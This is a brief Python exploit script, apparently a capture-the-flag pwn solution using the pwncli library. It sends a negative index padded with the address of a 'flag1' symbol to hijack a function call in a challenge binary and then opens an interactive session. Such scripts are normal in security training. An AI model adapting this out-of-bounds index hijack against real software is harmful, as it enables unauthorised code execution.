#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:2] == b"1\x00":
        ru(b'data: ')
        sl(key)

call_func(b"-31\x00".ljust(8, b"\x00") + p64(elf.symbols["flag1"]), 0)

ia()
